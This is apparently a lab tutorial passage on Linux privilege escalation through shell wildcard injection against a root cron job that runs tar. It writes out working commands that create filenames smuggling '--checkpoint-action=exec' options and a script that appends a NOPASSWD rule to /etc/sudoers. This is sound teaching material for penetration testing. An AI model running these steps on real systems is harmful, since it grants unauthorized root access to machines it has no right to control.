A wildcard character can be used as a replacement for other characters and are interpreted by the shell before other actions. Examples of wild cards include:

|**Character**|**Significance**|
|---|---|
|`*`|An asterisk that can match any number of characters in a file name.|
|`?`|Matches a single character.|
|`[ ]`|Brackets enclose characters and can match any single one at the defined position.|
|`~`|A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory.|
|`-`|A hyphen within brackets will denote a range of characters.|
An example of how wildcards can be abused for privilege escalation is the `tar` command, a common program for creating/extracting archives.
```shell
 man tar

<SNIP>
Informative output
       --checkpoint[=N]
              Display progress messages every Nth record (default 10).

       --checkpoint-action=ACTION
              Run ACTION on each checkpoint.
```

The `--checkpoint-action` option permits an `EXEC` action to be executed when a checkpoint is reached (i.e., run an arbitrary operating system command once the tar command executes.) By creating files with these names, when the wildcard is specified, `--checkpoint=1` and `--checkpoint-action=exec=sh root.sh` is passed to `tar` as command-line options. Let's see this in practice.

Consider the following cron job, which is set up to back up the `/home/htb-student` directory's contents and create a compressed archive within `/home/htb-student`. The cron job is set to run every minute, so it is a good candidate for privilege escalation.

```shell
#
#
mh dom mon dow command
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```

```shell
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
```

```shell
echo "" > "--checkpoint-action=exec=sh root.sh"
```

```shell
echo "" > --checkpoint=1
```

```shell
ls -la

total 56
drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .
drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..
-rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint=1
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unix
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix
-rw-rw-r--  1 htb-student htb-student   60 Aug 31 23:11 root.sh
```

